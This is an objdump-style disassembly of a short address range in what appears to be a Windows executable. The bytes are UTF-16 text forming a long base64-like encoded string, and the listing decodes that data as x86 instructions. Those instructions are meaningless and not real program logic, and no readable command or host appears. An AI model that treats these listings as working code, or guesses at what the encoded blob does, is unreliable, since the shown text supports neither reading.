  40a708:	00 6e 00             	add    %ch,0x0(%esi)
  40a70b:	6a 00                	push   $0x0
  40a70d:	33 00                	xor    (%eax),%eax
  40a70f:	6c                   	insb   (%dx),%es:(%edi)
  40a710:	00 75 00             	add    %dh,0x0(%ebp)
  40a713:	4e                   	dec    %esi
  40a714:	00 30                	add    %dh,(%eax)
  40a716:	00 6b 00             	add    %ch,0x0(%ebx)
  40a719:	72 00                	jb     0x40a71b
  40a71b:	6b 00 31             	imul   $0x31,(%eax),%eax
  40a71e:	00 35 00 59 00 64    	add    %dh,0x64005900
  40a724:	00 56 00             	add    %dl,0x0(%esi)
  40a727:	52                   	push   %edx
  40a728:	00 79 00             	add    %bh,0x0(%ecx)
  40a72b:	6c                   	insb   (%dx),%es:(%edi)
  40a72c:	00 75 00             	add    %dh,0x0(%ebp)
  40a72f:	2f                   	das
  40a730:	00 6f 00             	add    %ch,0x0(%edi)
  40a733:	43                   	inc    %ebx
  40a734:	00 79 00             	add    %bh,0x0(%ecx)
  40a737:	35 00 5a 00 54       	xor    $0x54005a00,%eax
  40a73c:	00 39                	add    %bh,(%ecx)
  40a73e:	00 4f 00             	add    %cl,0x0(%edi)
  40a741:	58                   	pop    %eax
  40a742:	00 64 00 68          	add    %ah,0x68(%eax,%eax,1)
  40a746:	00 35 00 6a 00 62    	add    %dh,0x62006a00
  40a74c:	00 4a 00             	add    %cl,0x0(%edx)
  40a74f:	37                   	aaa
  40a750:	00 4b 00             	add    %cl,0x0(%ebx)
  40a753:	54                   	push   %esp
  40a754:	00 77 00             	add    %dh,0x0(%edi)
  40a757:	71 00                	jno    0x40a759
  40a759:	65 00 32             	add    %dh,%gs:(%edx)
  40a75c:	00 54 00 47          	add    %dl,0x47(%eax,%eax,1)
  40a760:	00 48 00             	add    %cl,0x0(%eax)
  40a763:	6d                   	insl   (%dx),%es:(%edi)
  40a764:	00 41 00             	add    %al,0x0(%ecx)
  40a767:	46                   	inc    %esi
  40a768:	00 44 00 37          	add    %al,0x37(%eax,%eax,1)
  40a76c:	00 49 00             	add    %cl,0x0(%ecx)
  40a76f:	72 00                	jb     0x40a771
  40a771:	2b 00                	sub    (%eax),%eax
  40a773:	2f                   	das
  40a774:	00 41 00             	add    %al,0x0(%ecx)
  40a777:	37                   	aaa
  40a778:	00 45 00             	add    %al,0x0(%ebp)
  40a77b:	50                   	push   %eax
  40a77c:	00 67 00             	add    %ah,0x0(%edi)
  40a77f:	33 00                	xor    (%eax),%eax
  40a781:	50                   	push   %eax
  40a782:	00 6e 00             	add    %ch,0x0(%esi)
  40a785:	53                   	push   %ebx
  40a786:	00 77 00             	add    %dh,0x0(%edi)
  40a789:	35 00 4a 00 67       	xor    $0x67004a00,%eax
  40a78e:	00 46 00             	add    %al,0x0(%esi)
  40a791:	39 00                	cmp    %eax,(%eax)
  40a793:	67 00 74 00          	add    %dh,0x0(%si)
  40a797:	49                   	dec    %ecx
  40a798:	00 55 00             	add    %dl,0x0(%ebp)
  40a79b:	35 00 4d 00 56       	xor    $0x56004d00,%eax
  40a7a0:	00 5a 00             	add    %bl,0x0(%edx)
  40a7a3:	33 00                	xor    (%eax),%eax
  40a7a5:	33 00                	xor    (%eax),%eax
  40a7a7:	72 00                	jb     0x40a7a9
  40a7a9:	31 00                	xor    %eax,(%eax)
  40a7ab:	38 00                	cmp    %al,(%eax)
  40a7ad:	4e                   	dec    %esi
  40a7ae:	00 30                	add    %dh,(%eax)
  40a7b0:	00 75 00             	add    %dh,0x0(%ebp)
  40a7b3:	31 00                	xor    %eax,(%eax)
  40a7b5:	78 00                	js     0x40a7b7
  40a7b7:	30 00                	xor    %al,(%eax)
  40a7b9:	42                   	inc    %edx
  40a7ba:	00 41 00             	add    %al,0x0(%ecx)
  40a7bd:	42                   	inc    %edx
  40a7be:	00 69 00             	add    %ch,0x0(%ecx)
  40a7c1:	4a                   	dec    %edx
  40a7c2:	00 30                	add    %dh,(%eax)
  40a7c4:	00 62 00             	add    %ah,0x0(%edx)
  40a7c7:	41                   	inc    %ecx
  40a7c8:	00 65 00             	add    %ah,0x0(%ebp)
  40a7cb:	32 00                	xor    (%eax),%al
  40a7cd:	7a 00                	jp     0x40a7cf
  40a7cf:	66 00 6e 00          	data16 add %ch,0x0(%esi)
  40a7d3:	54                   	push   %esp
  40a7d4:	00 6b 00             	add    %ch,0x0(%ebx)
  40a7d7:	4c                   	dec    %esp
  40a7d8:	00 74 00 59          	add    %dh,0x59(%eax,%eax,1)
  40a7dc:	00 31                	add    %dh,(%ecx)
  40a7de:	00 5a 00             	add    %bl,0x0(%edx)
  40a7e1:	31 00                	xor    %eax,(%eax)
  40a7e3:	30 00                	xor    %al,(%eax)
  40a7e5:	48                   	dec    %eax
  40a7e6:	00 7a 00             	add    %bh,0x0(%edx)
  40a7e9:	41                   	inc    %ecx
  40a7ea:	00 75 00             	add    %dh,0x0(%ebp)
  40a7ed:	32 00                	xor    (%eax),%al
  40a7ef:	32 00                	xor    (%eax),%al
  40a7f1:	6c                   	insb   (%dx),%es:(%edi)
  40a7f2:	00 76 00             	add    %dh,0x0(%esi)
  40a7f5:	75 00                	jne    0x40a7f7
  40a7f7:	4d                   	dec    %ebp
  40a7f8:	00 4f 00             	add    %cl,0x0(%edi)
  40a7fb:	52                   	push   %edx
  40a7fc:	00 45 00             	add    %al,0x0(%ebp)
  40a7ff:	33 00                	xor    (%eax),%eax
  40a801:	55                   	push   %ebp
  40a802:	00 49 00             	add    %cl,0x0(%ecx)
  40a805:	39 00                	cmp    %eax,(%eax)
  40a807:	4a                   	dec    %edx
  40a808:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  40a80c:	00 71 00             	add    %dh,0x0(%ecx)
  40a80f:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
  40a813:	75 00                	jne    0x40a815
  40a815:	62 00                	bound  %eax,(%eax)
  40a817:	68 00 4b 00 49       	push   $0x49004b00
  40a81c:	00 33                	add    %dh,(%ebx)
  40a81e:	00 4f 00             	add    %cl,0x0(%edi)
  40a821:	75 00                	jne    0x40a823
  40a823:	53                   	push   %ebx
  40a824:	00 49 00             	add    %cl,0x0(%ecx)
  40a827:	2b 00                	sub    (%eax),%eax
  40a829:	55                   	push   %ebp
  40a82a:	00 68 00             	add    %ch,0x0(%eax)
  40a82d:	6d                   	insl   (%dx),%es:(%edi)
  40a82e:	00 6c 00 7a          	add    %ch,0x7a(%eax,%eax,1)
  40a832:	00 72 00             	add    %dh,0x0(%edx)
  40a835:	35 00 71 00 4e       	xor    $0x4e007100,%eax
  40a83a:	00 43 00             	add    %al,0x0(%ebx)
  40a83d:	38 00                	cmp    %al,(%eax)
  40a83f:	4f                   	dec    %edi
  40a840:	00 52 00             	add    %dl,0x0(%edx)
  40a843:	5a                   	pop    %edx
  40a844:	00 57 00             	add    %dl,0x0(%edi)
  40a847:	45                   	inc    %ebp
  40a848:	00 4e 00             	add    %cl,0x0(%esi)
  40a84b:	55                   	push   %ebp
  40a84c:	00 6b 00             	add    %ch,0x0(%ebx)
  40a84f:	2f                   	das
  40a850:	00 6d 00             	add    %ch,0x0(%ebp)
  40a853:	5a                   	pop    %edx
  40a854:	00 74 00 77          	add    %dh,0x77(%eax,%eax,1)
  40a858:	00 67 00             	add    %ah,0x0(%edi)
  40a85b:	62 00                	bound  %eax,(%eax)
  40a85d:	2b 00                	sub    (%eax),%eax
  40a85f:	6f                   	outsl  %ds:(%esi),(%dx)
  40a860:	00 65 00             	add    %ah,0x0(%ebp)
  40a863:	57                   	push   %edi
  40a864:	00 70 00             	add    %dh,0x0(%eax)
  40a867:	70 00                	jo     0x40a869
  40a869:	6e                   	outsb  %ds:(%esi),(%dx)
  40a86a:	00 62 00             	add    %ah,0x0(%edx)
  40a86d:	54                   	push   %esp
  40a86e:	00 49 00             	add    %cl,0x0(%ecx)
  40a871:	45                   	inc    %ebp
  40a872:	00 58 00             	add    %bl,0x0(%eax)
  40a875:	79 00                	jns    0x40a877
  40a877:	4c                   	dec    %esp
  40a878:	00 50 00             	add    %dl,0x0(%eax)
  40a87b:	52                   	push   %edx
  40a87c:	00 4f 00             	add    %cl,0x0(%edi)
  40a87f:	45                   	inc    %ebp
  40a880:	00 55 00             	add    %dl,0x0(%ebp)
  40a883:	44                   	inc    %esp
  40a884:	00 38                	add    %bh,(%eax)
  40a886:	00 58 00             	add    %bl,0x0(%eax)
  40a889:	4e                   	dec    %esi
  40a88a:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a88d:	34 00                	xor    $0x0,%al
  40a88f:	47                   	inc    %edi
  40a890:	00 56 00             	add    %dl,0x0(%esi)
  40a893:	57                   	push   %edi
  40a894:	00 42 00             	add    %al,0x0(%edx)
  40a897:	32 00                	xor    (%eax),%al
  40a899:	36 00 45 00          	add    %al,%ss:0x0(%ebp)
  40a89d:	33 00                	xor    (%eax),%eax
  40a89f:	51                   	push   %ecx
  40a8a0:	00 53 00             	add    %dl,0x0(%ebx)
  40a8a3:	2b 00                	sub    (%eax),%eax
  40a8a5:	45                   	inc    %ebp
  40a8a6:	00 63 00             	add    %ah,0x0(%ebx)
  40a8a9:	46                   	inc    %esi
  40a8aa:	00 4c 00 6a          	add    %cl,0x6a(%eax,%eax,1)
  40a8ae:	00 38                	add    %bh,(%eax)
  40a8b0:	00 46 00             	add    %al,0x0(%esi)
  40a8b3:	38 00                	cmp    %al,(%eax)
  40a8b5:	75 00                	jne    0x40a8b7
  40a8b7:	59                   	pop    %ecx
  40a8b8:	00 56 00             	add    %dl,0x0(%esi)
  40a8bb:	4d                   	dec    %ebp
  40a8bc:	00 79 00             	add    %bh,0x0(%ecx)
  40a8bf:	65 00 52 00          	add    %dl,%gs:0x0(%edx)
  40a8c3:	34 00                	xor    $0x0,%al
  40a8c5:	45                   	inc    %ebp
  40a8c6:	00 48 00             	add    %cl,0x0(%eax)
  40a8c9:	55                   	push   %ebp
  40a8ca:	00 76 00             	add    %dh,0x0(%esi)
  40a8cd:	47                   	inc    %edi
  40a8ce:	00 4c 00 58          	add    %cl,0x58(%eax,%eax,1)
  40a8d2:	00 63 00             	add    %ah,0x0(%ebx)
  40a8d5:	6d                   	insl   (%dx),%es:(%edi)
  40a8d6:	00 7a 00             	add    %bh,0x0(%edx)
  40a8d9:	71 00                	jno    0x40a8db
  40a8db:	2b 00                	sub    (%eax),%eax
  40a8dd:	6f                   	outsl  %ds:(%esi),(%dx)
  40a8de:	00 69 00             	add    %ch,0x0(%ecx)
  40a8e1:	56                   	push   %esi
  40a8e2:	00 2b                	add    %ch,(%ebx)
  40a8e4:	00 72 00             	add    %dh,0x0(%edx)
  40a8e7:	63 00                	arpl   %eax,(%eax)
  40a8e9:	4e                   	dec    %esi
  40a8ea:	00 42 00             	add    %al,0x0(%edx)
  40a8ed:	4b                   	dec    %ebx
  40a8ee:	00 63 00             	add    %ah,0x0(%ebx)
  40a8f1:	66 00 32             	data16 add %dh,(%edx)
  40a8f4:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40a8f8:	00 79 00             	add    %bh,0x0(%ecx)
  40a8fb:	35 00 66 00 72       	xor    $0x72006600,%eax
  40a900:	00 6c 00 59          	add    %ch,0x59(%eax,%eax,1)
  40a904:	00 49 00             	add    %cl,0x0(%ecx)
  40a907:	72 00                	jb     0x40a909
  40a909:	47                   	inc    %edi
  40a90a:	00 4d 00             	add    %cl,0x0(%ebp)
  40a90d:	53                   	push   %ebx
  40a90e:	00 36                	add    %dh,(%esi)
  40a910:	00 38                	add    %bh,(%eax)
  40a912:	00 62 00             	add    %ah,0x0(%edx)
  40a915:	37                   	aaa
  40a916:	00 67 00             	add    %ah,0x0(%edi)
  40a919:	4f                   	dec    %edi
  40a91a:	00 66 00             	add    %ah,0x0(%esi)
  40a91d:	62 00                	bound  %eax,(%eax)
  40a91f:	55                   	push   %ebp
  40a920:	00 2b                	add    %ch,(%ebx)
  40a922:	00 4e 00             	add    %cl,0x0(%esi)
  40a925:	2b 00                	sub    (%eax),%eax
  40a927:	58                   	pop    %eax
  40a928:	00 78 00             	add    %bh,0x0(%eax)
  40a92b:	52                   	push   %edx
  40a92c:	00 74 00 4b          	add    %dh,0x4b(%eax,%eax,1)
  40a930:	00 36                	add    %dh,(%esi)
  40a932:	00 76 00             	add    %dh,0x0(%esi)
  40a935:	59                   	pop    %ecx
  40a936:	00 79 00             	add    %bh,0x0(%ecx)
  40a939:	7a 00                	jp     0x40a93b
  40a93b:	35 00 79 00 6d       	xor    $0x6d007900,%eax
  40a940:	00 49 00             	add    %cl,0x0(%ecx)
  40a943:	64 00 2f             	add    %ch,%fs:(%edi)
  40a946:	00 73 00             	add    %dh,0x0(%ebx)
  40a949:	6c                   	insb   (%dx),%es:(%edi)
  40a94a:	00 78 00             	add    %bh,0x0(%eax)
  40a94d:	67 00 5a 00          	add    %bl,0x0(%bp,%si)
  40a951:	35 00 42 00 4d       	xor    $0x4d004200,%eax
  40a956:	00 51 00             	add    %dl,0x0(%ecx)
  40a959:	30 00                	xor    %al,(%eax)
  40a95b:	67 00 6d 00          	add    %ch,0x0(%di)
  40a95f:	30 00                	xor    %al,(%eax)
  40a961:	30 00                	xor    %al,(%eax)
  40a963:	4a                   	dec    %edx
  40a964:	00 54 00 62          	add    %dl,0x62(%eax,%eax,1)
  40a968:	00 6f 00             	add    %ch,0x0(%edi)
  40a96b:	43                   	inc    %ebx
  40a96c:	00 67 00             	add    %ah,0x0(%edi)
  40a96f:	70 00                	jo     0x40a971
  40a971:	63 00                	arpl   %eax,(%eax)
  40a973:	54                   	push   %esp
  40a974:	00 72 00             	add    %dh,0x0(%edx)
  40a977:	4b                   	dec    %ebx
  40a978:	00 6f 00             	add    %ch,0x0(%edi)
  40a97b:	63 00                	arpl   %eax,(%eax)
  40a97d:	7a 00                	jp     0x40a97f
  40a97f:	69 00 62 00 6b 00    	imul   $0x6b0062,(%eax),%eax
  40a985:	6b 00 6d             	imul   $0x6d,(%eax),%eax
  40a988:	00 77 00             	add    %dh,0x0(%edi)
  40a98b:	36 00 49 00          	add    %cl,%ss:0x0(%ecx)
  40a98f:	43                   	inc    %ebx
  40a990:	00 41 00             	add    %al,0x0(%ecx)
  40a993:	4f                   	dec    %edi
  40a994:	00 44 00 56          	add    %al,0x56(%eax,%eax,1)
  40a998:	00 4a 00             	add    %cl,0x0(%edx)
  40a99b:	47                   	inc    %edi
  40a99c:	00 6d 00             	add    %ch,0x0(%ebp)
  40a99f:	41                   	inc    %ecx
  40a9a0:	00 74 00 63          	add    %dh,0x63(%eax,%eax,1)
  40a9a4:	00 7a 00             	add    %bh,0x0(%edx)
  40a9a7:	49                   	dec    %ecx
  40a9a8:	00 47 00             	add    %al,0x0(%edi)
  40a9ab:	45                   	inc    %ebp
  40a9ac:	00 70 00             	add    %dh,0x0(%eax)
  40a9af:	5a                   	pop    %edx
  40a9b0:	00 79 00             	add    %bh,0x0(%ecx)
  40a9b3:	6b 00 38             	imul   $0x38,(%eax),%eax
  40a9b6:	00 61 00             	add    %ah,0x0(%ecx)
  40a9b9:	59                   	pop    %ecx
  40a9ba:	00 6f 00             	add    %ch,0x0(%edi)
  40a9bd:	58                   	pop    %eax
  40a9be:	00 4a 00             	add    %cl,0x0(%edx)
  40a9c1:	4e                   	dec    %esi
  40a9c2:	00 45 00             	add    %al,0x0(%ebp)
  40a9c5:	2f                   	das
  40a9c6:	00 63 00             	add    %ah,0x0(%ebx)
  40a9c9:	34 00                	xor    $0x0,%al
  40a9cb:	41                   	inc    %ecx
  40a9cc:	00 42 00             	add    %al,0x0(%edx)
  40a9cf:	5a                   	pop    %edx
  40a9d0:	00 39                	add    %bh,(%ecx)
  40a9d2:	00 47 00             	add    %al,0x0(%edi)
  40a9d5:	62 00                	bound  %eax,(%eax)
  40a9d7:	4f                   	dec    %edi
  40a9d8:	00 64 00 39          	add    %ah,0x39(%eax,%eax,1)
  40a9dc:	00 38                	add    %bh,(%eax)
  40a9de:	00 57 00             	add    %dl,0x0(%edi)
  40a9e1:	4a                   	dec    %edx
  40a9e2:	00 4c 00 56          	add    %cl,0x56(%eax,%eax,1)
  40a9e6:	00 7a 00             	add    %bh,0x0(%edx)
  40a9e9:	35 00 63 00 53       	xor    $0x53006300,%eax
  40a9ee:	00 70 00             	add    %dh,0x0(%eax)
  40a9f1:	39 00                	cmp    %eax,(%eax)
  40a9f3:	70 00                	jo     0x40a9f5
  40a9f5:	62 00                	bound  %eax,(%eax)
  40a9f7:	6c                   	insb   (%dx),%es:(%edi)
  40a9f8:	00 2f                	add    %ch,(%edi)
  40a9fa:	00 59 00             	add    %bl,0x0(%ecx)
  40a9fd:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40aa01:	2b 00                	sub    (%eax),%eax
  40aa03:	6d                   	insl   (%dx),%es:(%edi)
  40aa04:	00 66 00             	add    %ah,0x0(%esi)
  40aa07:	4b                   	dec    %ebx
  40aa08:	00 36                	add    %dh,(%esi)
  40aa0a:	00 6d 00             	add    %ch,0x0(%ebp)
  40aa0d:	6c                   	insb   (%dx),%es:(%edi)
  40aa0e:	00 4a 00             	add    %cl,0x0(%edx)
  40aa11:	79 00                	jns    0x40aa13
  40aa13:	41                   	inc    %ecx
  40aa14:	00 36                	add    %dh,(%esi)
  40aa16:	00 55 00             	add    %dl,0x0(%ebp)
  40aa19:	67 00 2b             	add    %ch,(%bp,%di)
  40aa1c:	00 67 00             	add    %ah,0x0(%edi)
  40aa1f:	61                   	popa
  40aa20:	00 2b                	add    %ch,(%ebx)
  40aa22:	00 69 00             	add    %ch,0x0(%ecx)
  40aa25:	56                   	push   %esi
  40aa26:	00 62 00             	add    %ah,0x0(%edx)
  40aa29:	34 00                	xor    $0x0,%al
  40aa2b:	44                   	inc    %esp
  40aa2c:	00 62 00             	add    %ah,0x0(%edx)
  40aa2f:	4b                   	dec    %ebx
  40aa30:	00 46 00             	add    %al,0x0(%esi)
  40aa33:	51                   	push   %ecx
  40aa34:	00 45 00             	add    %al,0x0(%ebp)
  40aa37:	43                   	inc    %ebx
  40aa38:	00 59 00             	add    %bl,0x0(%ecx)
  40aa3b:	69 00 51 00 74 00    	imul   $0x740051,(%eax),%eax
  40aa41:	76 00                	jbe    0x40aa43
  40aa43:	58                   	pop    %eax
  40aa44:	00 74 00 67          	add    %dh,0x67(%eax,%eax,1)
  40aa48:	00 53 00             	add    %dl,0x0(%ebx)
  40aa4b:	34 00                	xor    $0x0,%al
  40aa4d:	67 00 4d 00          	add    %cl,0x0(%di)
  40aa51:	67 00 44 00          	add    %al,0x0(%si)
  40aa55:	38 00                	cmp    %al,(%eax)
  40aa57:	58                   	pop    %eax
  40aa58:	00 77 00             	add    %dh,0x0(%edi)
  40aa5b:	7a 00                	jp     0x40aa5d
  40aa5d:	71 00                	jno    0x40aa5f
  40aa5f:	36 00 4e 00          	add    %cl,%ss:0x0(%esi)
  40aa63:	78 00                	js     0x40aa65
  40aa65:	4e                   	dec    %esi
  40aa66:	00 46 00             	add    %al,0x0(%esi)
  40aa69:	63 00                	arpl   %eax,(%eax)
  40aa6b:	65 00 42 00          	add    %al,%gs:0x0(%edx)
  40aa6f:	2b 00                	sub    (%eax),%eax
  40aa71:	45                   	inc    %ebp
  40aa72:	00 38                	add    %bh,(%eax)
  40aa74:	00 2f                	add    %ch,(%edi)
  40aa76:	00 65 00             	add    %ah,0x0(%ebp)
  40aa79:	75 00                	jne    0x40aa7b
  40aa7b:	63 00                	arpl   %eax,(%eax)
  40aa7d:	50                   	push   %eax
  40aa7e:	00 6a 00             	add    %ch,0x0(%edx)
  40aa81:	45                   	inc    %ebp
  40aa82:	00 53 00             	add    %dl,0x0(%ebx)
  40aa85:	38 00                	cmp    %al,(%eax)
  40aa87:	58                   	pop    %eax
  40aa88:	00 66 00             	add    %ah,0x0(%esi)
  40aa8b:	66 00 4d 00          	data16 add %cl,0x0(%ebp)
  40aa8f:	66 00 6b 00          	data16 add %ch,0x0(%ebx)
  40aa93:	58                   	pop    %eax
  40aa94:	00 77 00             	add    %dh,0x0(%edi)
  40aa97:	44                   	inc    %esp
  40aa98:	00 6e 00             	add    %ch,0x0(%esi)
  40aa9b:	38 00                	cmp    %al,(%eax)
  40aa9d:	51                   	push   %ecx
  40aa9e:	00 49 00             	add    %cl,0x0(%ecx)
  40aaa1:	48                   	dec    %eax
  40aaa2:	00 44 00 7a          	add    %al,0x7a(%eax,%eax,1)
  40aaa6:	00 4e 00             	add    %cl,0x0(%esi)
  40aaa9:	5a                   	pop    %edx
  40aaaa:	00 45 00             	add    %al,0x0(%ebp)
  40aaad:	74 00                	je     0x40aaaf
  40aaaf:	78 00                	js     0x40aab1
  40aab1:	5a                   	pop    %edx
  40aab2:	00 62 00             	add    %ah,0x0(%edx)
  40aab5:	76 00                	jbe    0x40aab7
  40aab7:	6c                   	insb   (%dx),%es:(%edi)
  40aab8:	00 66 00             	add    %ah,0x0(%esi)
  40aabb:	44                   	inc    %esp
  40aabc:	00 61 00             	add    %ah,0x0(%ecx)
  40aabf:	67 00 4b 00          	add    %cl,0x0(%bp,%di)
  40aac3:	43                   	inc    %ebx
  40aac4:	00 68 00             	add    %ch,0x0(%eax)
  40aac7:	6e                   	outsb  %ds:(%esi),(%dx)
  40aac8:	00 38                	add    %bh,(%eax)
  40aaca:	00 52 00             	add    %dl,0x0(%edx)
  40aacd:	69 00 73 00 31 00    	imul   $0x310073,(%eax),%eax
  40aad3:	66 00 59 00          	data16 add %bl,0x0(%ecx)
  40aad7:	4b                   	dec    %ebx
  40aad8:	00 2b                	add    %ch,(%ebx)
  40aada:	00 2f                	add    %ch,(%edi)
  40aadc:	00 71 00             	add    %dh,0x0(%ecx)
  40aadf:	49                   	dec    %ecx
  40aae0:	00 44 00 43          	add    %al,0x43(%eax,%eax,1)
  40aae4:	00 64 00 44          	add    %ah,0x44(%eax,%eax,1)
  40aae8:	00 71 00             	add    %dh,0x0(%ecx)
  40aaeb:	68 00 2b 00 49       	push   $0x49002b00
  40aaf0:	00 63 00             	add    %ah,0x0(%ebx)
  40aaf3:	48                   	dec    %eax
  40aaf4:	00 4c 00 45          	add    %cl,0x45(%eax,%eax,1)
  40aaf8:	00 71 00             	add    %dh,0x0(%ecx)
  40aafb:	43                   	inc    %ebx
  40aafc:	00 47 00             	add    %al,0x0(%edi)
  40aaff:	68 00 6b 00 46       	push   $0x46006b00
  40ab04:	00 36                	add    %dh,(%esi)
  40ab06:	00 2b                	add    %ch,(%ebx)
  40ab08:	00 6a 00             	add    %ch,0x0(%edx)
  40ab0b:	50                   	push   %eax
  40ab0c:	00 2f                	add    %ch,(%edi)
  40ab0e:	00 54 00 50          	add    %dl,0x50(%eax,%eax,1)
  40ab12:	00 57 00             	add    %dl,0x0(%edi)
  40ab15:	78 00                	js     0x40ab17
  40ab17:	79 00                	jns    0x40ab19
  40ab19:	50                   	push   %eax
  40ab1a:	00 31                	add    %dh,(%ecx)
  40ab1c:	00 64 00 38          	add    %ah,0x38(%eax,%eax,1)
  40ab20:	00 4c 00 39          	add    %cl,0x39(%eax,%eax,1)
  40ab24:	00 71 00             	add    %dh,0x0(%ecx)
  40ab27:	58                   	pop    %eax
  40ab28:	00 35 00 78 00 55    	add    %dh,0x55007800
  40ab2e:	00 62 00             	add    %ah,0x0(%edx)
  40ab31:	74 00                	je     0x40ab33
  40ab33:	4e                   	dec    %esi
  40ab34:	00 4d 00             	add    %cl,0x0(%ebp)
  40ab37:	48                   	dec    %eax
  40ab38:	00 66 00             	add    %ah,0x0(%esi)
  40ab3b:	6f                   	outsl  %ds:(%esi),(%dx)
  40ab3c:	00 2f                	add    %ch,(%edi)
  40ab3e:	00 30                	add    %dh,(%eax)
  40ab40:	00 78 00             	add    %bh,0x0(%eax)
  40ab43:	67 00 59 00          	add    %bl,0x0(%bx,%di)
  40ab47:	61                   	popa
  40ab48:	00 6b 00             	add    %ch,0x0(%ebx)
  40ab4b:	51                   	push   %ecx
  40ab4c:	00 43 00             	add    %al,0x0(%ebx)
  40ab4f:	62 00                	bound  %eax,(%eax)
  40ab51:	73 00                	jae    0x40ab53
  40ab53:	37                   	aaa
  40ab54:	00 6c 00 32          	add    %ch,0x32(%eax,%eax,1)
  40ab58:	00 39                	add    %bh,(%ecx)
  40ab5a:	00 4f 00             	add    %cl,0x0(%edi)
  40ab5d:	55                   	push   %ebp
  40ab5e:	00 2f                	add    %ch,(%edi)
  40ab60:	00 66 00             	add    %ah,0x0(%esi)
  40ab63:	4c                   	dec    %esp
  40ab64:	00 32                	add    %dh,(%edx)
  40ab66:	00 53 00             	add    %dl,0x0(%ebx)
  40ab69:	46                   	inc    %esi
  40ab6a:	00 57 00             	add    %dl,0x0(%edi)
  40ab6d:	31 00                	xor    %eax,(%eax)
  40ab6f:	66 00 33             	data16 add %dh,(%ebx)
  40ab72:	00 4f 00             	add    %cl,0x0(%edi)
  40ab75:	53                   	push   %ebx
  40ab76:	00 71 00             	add    %dh,0x0(%ecx)
  40ab79:	39 00                	cmp    %eax,(%eax)
  40ab7b:	49                   	dec    %ecx
  40ab7c:	00 47 00             	add    %al,0x0(%edi)
  40ab7f:	52                   	push   %edx
  40ab80:	00 47 00             	add    %al,0x0(%edi)
  40ab83:	69 00 48 00 35 00    	imul   $0x350048,(%eax),%eax
  40ab89:	4f                   	dec    %edi
  40ab8a:	00 49 00             	add    %cl,0x0(%ecx)
  40ab8d:	69 00 34 00 53 00    	imul   $0x530034,(%eax),%eax
  40ab93:	30 00                	xor    %al,(%eax)
  40ab95:	6b 00 49             	imul   $0x49,(%eax),%eax
  40ab98:	00 4f 00             	add    %cl,0x0(%edi)
  40ab9b:	74 00                	je     0x40ab9d
  40ab9d:	6c                   	insb   (%dx),%es:(%edi)
  40ab9e:	00 4b 00             	add    %cl,0x0(%ebx)
  40aba1:	32 00                	xor    (%eax),%al
  40aba3:	78 00                	js     0x40aba5
  40aba5:	38 00                	cmp    %al,(%eax)
  40aba7:	74 00                	je     0x40aba9
  40aba9:	5a                   	pop    %edx
  40abaa:	00 4e 00             	add    %cl,0x0(%esi)
  40abad:	61                   	popa
  40abae:	00 68 00             	add    %ch,0x0(%eax)
  40abb1:	69 00 63 00 4b 00    	imul   $0x4b0063,(%eax),%eax
  40abb7:	32 00                	xor    (%eax),%al
  40abb9:	34 00                	xor    $0x0,%al
  40abbb:	68 00 49 00 6a       	push   $0x6a004900
  40abc0:	00 67 00             	add    %ah,0x0(%edi)
  40abc3:	39 00                	cmp    %eax,(%eax)
  40abc5:	41                   	inc    %ecx
  40abc6:	00 34 00             	add    %dh,(%eax,%eax,1)
  40abc9:	53                   	push   %ebx
  40abca:	00 72 00             	add    %dh,0x0(%edx)
  40abcd:	61                   	popa
  40abce:	00 63 00             	add    %ah,0x0(%ebx)
  40abd1:	30 00                	xor    %al,(%eax)
  40abd3:	58                   	pop    %eax
  40abd4:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40abd8:	00 67 00             	add    %ah,0x0(%edi)
  40abdb:	59                   	pop    %ecx
  40abdc:	00 36                	add    %dh,(%esi)
  40abde:	00 4e 00             	add    %cl,0x0(%esi)
  40abe1:	70 00                	jo     0x40abe3
  40abe3:	44                   	inc    %esp
  40abe4:	00 50 00             	add    %dl,0x0(%eax)
  40abe7:	66 00 73 00          	data16 add %dh,0x0(%ebx)
  40abeb:	69 00 35 00 4e 00    	imul   $0x4e0035,(%eax),%eax
  40abf1:	66 00 7a 00          	data16 add %bh,0x0(%edx)
  40abf5:	56                   	push   %esi
  40abf6:	00 53 00             	add    %dl,0x0(%ebx)
  40abf9:	6b 00 32             	imul   $0x32,(%eax),%eax
  40abfc:	00 78 00             	add    %bh,0x0(%eax)
  40abff:	32 00                	xor    (%eax),%al
  40ac01:	61                   	popa
  40ac02:	00 70 00             	add    %dh,0x0(%eax)
  40ac05:	56                   	push   %esi
  40ac06:	00 72 00             	add    %dh,0x0(%edx)
  40ac09:	74 00                	je     0x40ac0b
  40ac0b:	4c                   	dec    %esp
  40ac0c:	00 41 00             	add    %al,0x0(%ecx)
  40ac0f:	79 00                	jns    0x40ac11
  40ac11:	74 00                	je     0x40ac13
  40ac13:	2b 00                	sub    (%eax),%eax
  40ac15:	52                   	push   %edx
  40ac16:	00 59 00             	add    %bl,0x0(%ecx)
  40ac19:	6a 00                	push   $0x0
  40ac1b:	4b                   	dec    %ebx
  40ac1c:	00 30                	add    %dh,(%eax)
  40ac1e:	00 4e 00             	add    %cl,0x0(%esi)
  40ac21:	4f                   	dec    %edi
  40ac22:	00 4c 00 47          	add    %cl,0x47(%eax,%eax,1)
  40ac26:	00 64 00 70          	add    %ah,0x70(%eax,%eax,1)
  40ac2a:	00 55 00             	add    %dl,0x0(%ebp)
  40ac2d:	57                   	push   %edi
  40ac2e:	00 70 00             	add    %dh,0x0(%eax)
  40ac31:	2b 00                	sub    (%eax),%eax
  40ac33:	39 00                	cmp    %eax,(%eax)
  40ac35:	42                   	inc    %edx
  40ac36:	00 49 00             	add    %cl,0x0(%ecx)
  40ac39:	55                   	push   %ebp
  40ac3a:	00 38                	add    %bh,(%eax)
  40ac3c:	00 57 00             	add    %dl,0x0(%edi)
  40ac3f:	63 00                	arpl   %eax,(%eax)
  40ac41:	43                   	inc    %ebx
  40ac42:	00 6b 00             	add    %ch,0x0(%ebx)
  40ac45:	3d 00 00 87 b1       	cmp    $0xb1870000,%eax
  40ac4a:	4b                   	dec    %ebx
  40ac4b:	00 61 00             	add    %ah,0x0(%ecx)
  40ac4e:	2b 00                	sub    (%eax),%eax
  40ac50:	52                   	push   %edx
  40ac51:	00 62 00             	add    %ah,0x0(%edx)
  40ac54:	32 00                	xor    (%eax),%al
  40ac56:	31 00                	xor    %eax,(%eax)
